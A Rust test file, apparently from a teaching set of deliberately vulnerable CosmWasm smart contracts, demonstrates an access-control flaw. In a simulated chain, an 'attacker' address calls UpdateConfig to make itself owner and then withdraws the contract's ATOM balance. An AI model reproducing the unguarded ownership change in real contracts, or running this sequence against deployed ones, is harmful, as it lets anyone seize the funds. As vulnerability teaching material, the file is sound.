use cosmwasm_std::{Addr, Coin, coin, Querier};
use cosmwasm_std::{QueryRequest, BankQuery, to_binary, from_binary, BalanceResponse};
use cw_unhandled::contract::{execute, instantiate, query};
use cw_unhandled::msg::{InstantiateMsg, ExecuteMsg};
use cw_multi_test::{App, ContractWrapper, Executor};

fn mint_native(app: &mut App, beneficiary: String, denom: String, amount: u128) {
    app.sudo(cw_multi_test::SudoMsg::Bank(
        cw_multi_test::BankSudo::Mint {
            to_address: beneficiary,
            amount: vec![coin(amount, denom)],
        },
    ))
    .unwrap();
}

fn query_balance_native(app: &App, address: &Addr, denom: &str) -> Coin {
    let req: QueryRequest<BankQuery> = QueryRequest::Bank(BankQuery::Balance { address: address.to_string(), denom: denom.to_string() });
    let res = app.raw_query(&to_binary(&req).unwrap()).unwrap().unwrap();
    let balance: BalanceResponse = from_binary(&res).unwrap();

    return balance.amount;        
}

#[test]
    fn insufficient_access_control_test() {
        let mut app = App::default();
        let code = ContractWrapper::new(execute, instantiate, query);
        let code_id = app.store_code(Box::new(code));
        // The contract has no real life functionality
        // It can change the config of the contract
        // It can send current balance to chosen receiver.
        let contract_addr = app
            .instantiate_contract(
                code_id,
                Addr::unchecked("owner"),
                &InstantiateMsg { owner: Addr::unchecked("owner").to_string() },
                &[],
                "Contract",
                None,
            )
            .unwrap();
            mint_native(&mut app, contract_addr.to_string(), "ATOM".to_string(), 100);
            //this should fail
            let withdraw_res = app.execute_contract(Addr::unchecked("attacker"), contract_addr.clone(), &ExecuteMsg::Withdraw{destination: "attacker".to_string()}, &[]);
            println!("{:?}", withdraw_res.as_ref());
            assert!(withdraw_res.is_err());
            // Attacker update config
            let update_res = app.execute_contract(Addr::unchecked("attacker"), contract_addr.clone(), &ExecuteMsg::UpdateConfig { new_owner: "attacker".to_string() }, &[]);
            println!("{:?}",update_res.as_ref().unwrap());
            assert!(update_res.is_ok());
            let withdraw_success_res  = app.execute_contract(Addr::unchecked("attacker"), contract_addr.clone(), &ExecuteMsg::Withdraw{destination: "attacker".to_string()}, &[]);
            println!("{:?}",withdraw_success_res.as_ref().unwrap());
            assert!(withdraw_success_res.is_ok());
            let balance = query_balance_native(&mut app, &Addr::unchecked("attacker"), &"ATOM");
            assert_eq!(coin(100, "ATOM"), balance);
        }
        